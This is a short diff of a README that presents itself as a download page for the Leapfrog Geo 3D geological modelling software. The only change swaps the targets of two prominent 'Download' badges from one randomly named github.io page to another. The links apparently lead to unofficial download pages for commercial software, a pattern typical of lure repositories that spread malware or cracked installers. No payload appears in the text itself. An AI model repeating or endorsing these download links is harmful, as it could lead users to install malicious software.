@@ -1,7 +1,7 @@
 # ⛏️ Leapfrog Geo — 3D Geological Modeling Software
 
-[![Download Leapfrog Geo](https://img.shields.io/badge/Download_Leapfrog_Geo-darkgreen?style=for-the-badge)](https://leapfrogtoolmodelinf01.github.io/.github/)  
-[![Model in 3D](https://img.shields.io/badge/Model_in_3D-gold?style=for-the-badge&logo=earth)](https://leapfrogtoolmodelinf01.github.io/.github/)
+[![Download Leapfrog Geo](https://img.shields.io/badge/Download_Leapfrog_Geo-darkgreen?style=for-the-badge)](https://leapfrog1toolmodel0geo.github.io/.github/)  
+[![Model in 3D](https://img.shields.io/badge/Model_in_3D-gold?style=for-the-badge&logo=earth)](https://leapfrog1toolmodel0geo.github.io/.github/)
 
 ---
 
